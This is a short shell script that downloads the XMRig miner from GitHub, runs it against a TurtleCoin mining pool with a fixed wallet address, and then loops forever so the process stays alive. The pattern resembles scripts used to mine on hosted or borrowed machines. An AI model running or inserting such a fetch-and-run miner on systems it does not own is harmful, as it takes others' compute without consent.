#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o us.turtlecoin.herominers.com:1160 -u TRTLv2Ai7BPK53miaygVabRJAVvmqWhyGjkuhHHRrDvdg3EgJZgtG1TBcSKEwQ37cM4RaLsELC8z14ev6RFpK6fCVzjUeWEj3kY -p zero -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
